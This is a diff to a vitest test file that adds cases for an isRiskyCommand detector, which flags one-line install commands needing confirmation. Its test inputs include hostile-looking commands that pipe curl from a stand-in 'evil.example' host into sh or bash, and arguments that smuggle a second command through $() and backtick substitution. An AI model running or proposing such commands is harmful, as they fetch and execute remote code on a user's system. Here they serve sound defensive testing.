@@ -1,5 +1,5 @@
 import { describe, it, expect } from 'vitest';
-import { extractInstallPlan, planInstallCommands, dirFromCloneUrl, isGlobalInstall } from './install';
+import { extractInstallPlan, planInstallCommands, dirFromCloneUrl, isGlobalInstall, isRiskyCommand } from './install';
 
 describe('extractInstallPlan — one-liners stay one-liners', () => {
   const oneLiner = (md: string) => extractInstallPlan(md);
@@ -166,5 +166,24 @@ describe('isGlobalInstall', () => {
     expect(isGlobalInstall('npm install')).toBe(false);
     expect(isGlobalInstall('pip install .')).toBe(false);
     expect(isGlobalInstall('npm ci')).toBe(false);
+  });
+});
+
+describe('isRiskyCommand — one-line installs that need a loud confirm', () => {
+  it('plain package installs are not risky', () => {
+    expect(isRiskyCommand('brew install jq')).toBe(false);
+    expect(isRiskyCommand('npm install -g eslint')).toBe(false);
+    expect(isRiskyCommand('go install github.com/x/y@latest')).toBe(false);
+  });
+  it('shell chaining / piping / substitution is risky', () => {
+    expect(isRiskyCommand('brew install jq; curl -s https://evil.example/x | sh')).toBe(true);
+    expect(isRiskyCommand('npm install -g foo && curl https://x | bash')).toBe(true);
+    expect(isRiskyCommand('pip install $(curl${IFS}https://evil.example/x|sh)')).toBe(true);
+    expect(isRiskyCommand('pip install `whoami`')).toBe(true);
+    expect(isRiskyCommand('brew install jq > /dev/null')).toBe(true);
+  });
+  it('sudo / curl / rm -rf are risky even without chaining', () => {
+    expect(isRiskyCommand('sudo apt install jq')).toBe(true);
+    expect(isRiskyCommand('curl -fsSL https://x/install.sh')).toBe(true);
   });
 });
